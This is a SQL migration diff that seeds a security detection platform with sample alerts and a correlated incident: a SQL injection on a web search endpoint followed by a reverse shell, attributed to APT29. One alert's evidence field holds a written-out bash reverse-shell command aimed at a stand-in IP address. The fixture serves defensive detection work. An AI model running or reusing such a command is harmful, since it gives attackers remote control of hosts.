@@ -243,3 +243,35 @@ INSERT INTO core_identity_principals (
 ('usr-admin-okta', 'org-01', 'acc-sec-01', 'alice.admin.okta', 'alice.admin@acme-defense.internal', 'arn:okta:user/alice.admin', 'HUMAN_USER', 'INFRASTRUCTURE_SECURITY', FALSE, TRUE, TRUE)
 ON CONFLICT (principal_id) DO NOTHING;
 
+-- ----------------------------------------------------------------------------
+-- 10. Correlated Detection Alerts and Incidents
+-- ----------------------------------------------------------------------------
+
+INSERT INTO detection_alerts (
+    alert_id, rule_id, account_id, entity_type, entity_id,
+    detected_at, window_start, window_end, severity, confidence_score, composite_risk_score,
+    title, summary, evidence_json, tactic_code, technique_code, status
+) VALUES
+('alt-01', 'rule-0104', 'acc-prod-01', 'ASSET', 'ast-web-01',
+ '2026-10-15 14:02:15', '2026-10-15 14:00:00', '2026-10-15 14:05:00', 'HIGH', 90.0, 88.0,
+ 'Web Ingress Application Attack on ast-web-01', 'SQL injection attack detected on search endpoint',
+ '{"uri":"/api/v1/search"}', 'TA0001', 'T1190', 'CORRELATED'),
+('alt-02', 'rule-0202', 'acc-prod-01', 'ASSET', 'ast-web-01',
+ '2026-10-15 14:05:00', '2026-10-15 14:00:00', '2026-10-15 14:10:00', 'CRITICAL', 98.0, 96.0,
+ 'Interactive Reverse Shell on ast-web-01', 'Reverse interactive shell bound to port 443',
+ '{"cmd":"sh -i >& /dev/tcp/198.51.100.42/443"}', 'TA0002', 'T1059.004', 'CORRELATED')
+ON CONFLICT (alert_id) DO NOTHING;
+
+INSERT INTO incidents (
+    incident_id, title, severity, current_state, composite_risk_score,
+    blast_radius_assets, primary_tactic_code, root_cause_summary, assigned_analyst_id
+) VALUES
+('inc-001', 'APT29 Active Host Compromise and Reverse Shell on ast-web-01', 'CRITICAL', 'TRIAGED', 98.0, 4, 'TA0001', 'Web application exploit leading to reverse shell execution', 'usr-admin-01')
+ON CONFLICT (incident_id) DO NOTHING;
+
+INSERT INTO incident_alert_links (link_id, incident_id, alert_id, kill_chain_order, correlation_weight) VALUES
+('ial-01', 'inc-001', 'alt-01', 1, 1.00),
+('ial-02', 'inc-001', 'alt-02', 2, 1.00)
+ON CONFLICT (link_id) DO NOTHING;
+
+
